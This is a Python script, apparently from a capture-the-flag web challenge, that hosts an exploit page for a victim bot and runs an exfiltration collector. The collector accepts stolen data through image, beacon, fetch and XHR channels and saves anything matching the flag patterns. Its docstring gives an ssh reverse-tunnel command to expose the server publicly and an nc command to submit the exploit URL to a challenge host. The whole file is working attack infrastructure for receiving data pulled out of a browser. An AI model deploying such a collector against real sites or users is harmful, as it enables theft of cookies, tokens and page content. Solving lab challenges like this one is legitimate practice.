#!/usr/bin/env python3
"""Hosts the exploit page and collects whatever the renderer sends back.

Serves every file in this directory, and accepts the four exfil channels
exploit.js uses (Image src, sendBeacon, fetch keepalive, sync XHR POST) plus
the progress log.  Anything that looks like a flag is highlighted and appended
to flag.txt so it survives the session.

    python3 collector.py [port]

To make it reachable by the bot:

    ssh -R 80:localhost:8000 nokey@localhost.run

and submit the https URL it prints, with /exploit.html on the end, to

    nc 113.20.103.216 31337

If the tunnel gives you a different hostname for the collector than for the
page, pass it to the page:  https://<page-host>/exploit.html?c=https://<collector-host>/exfil
"""
import http.server
import os
import re
import socketserver
import sys
import urllib.parse
from datetime import datetime

ROOT = os.path.dirname(os.path.abspath(__file__))
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
FLAG_RE = re.compile(r"(CSCV\d*\{[^}]*\}|SVATTT\{[^}]*\})")
HITS = []


def record(kind, text):
    stamp = datetime.now().strftime("%H:%M:%S")
    flags = FLAG_RE.findall(text or "")
    if flags:
        for f in flags:
            if f not in HITS:
                HITS.append(f)
                with open(os.path.join(ROOT, "flag.txt"), "a") as fh:
                    fh.write(f + "\n")
            print("\n" + "=" * 68)
            print("  FLAG  ", f)
            print("=" * 68 + "\n", flush=True)
    else:
        print("[%s] %-6s %s" % (stamp, kind, (text or "")[:400]), flush=True)


class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory=ROOT, **k)

    def log_message(self, fmt, *a):
        pass

    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        super().end_headers()

    def _ok(self, body=b"ok"):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if p.path.rstrip("/").endswith("exfil") or p.path == "/exfil":
            q = urllib.parse.parse_qs(p.query)
            for key in ("log", "img", "fetch", "beacon", "flag"):
                if key in q:
                    record("LOG" if key == "log" else "EXFIL", q[key][0])
            return self._ok()
        if p.path in ("/", ""):
            self.path = "/exploit.html"
        return super().do_GET()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace")
        record("POST", body)
        return self._ok()


socketserver.TCPServer.allow_reuse_address = True


class Server(socketserver.ThreadingTCPServer):
    daemon_threads = True


if __name__ == "__main__":
    print("serving %s on 0.0.0.0:%d" % (ROOT, PORT))
    print("page:  http://127.0.0.1:%d/exploit.html" % PORT)
    print("tunnel: ssh -R 80:localhost:%d nokey@localhost.run" % PORT)
    with Server(("0.0.0.0", PORT), H) as s:
        try:
            s.serve_forever()
        except KeyboardInterrupt:
            pass
    if HITS:
        print("\ncollected flags:")
        for f in HITS:
            print("  " + f)
